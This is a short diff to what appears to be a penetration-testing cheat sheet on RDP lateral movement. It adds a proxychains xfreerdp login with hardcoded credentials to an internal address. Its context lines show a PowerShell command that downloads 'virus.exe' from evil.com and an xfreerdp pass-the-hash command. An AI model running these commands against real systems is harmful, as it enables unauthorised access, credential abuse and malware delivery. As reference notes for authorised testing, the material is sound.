@@ -56,6 +56,12 @@ System.Net.WebClient).DownloadFile('http://evil.com/virus.exe',
 xfreerdp /d:domain  /u:user  /pth:NTLM_HASH  /v:DEST_IP
 ```
 
+#### Local machine
+
+```csharp
+proxychains  xfreerdp   /u:b3v1l /p:Password!  /v:172.16.1.16
+```
+
 ### rdesktop
 
 ```csharp
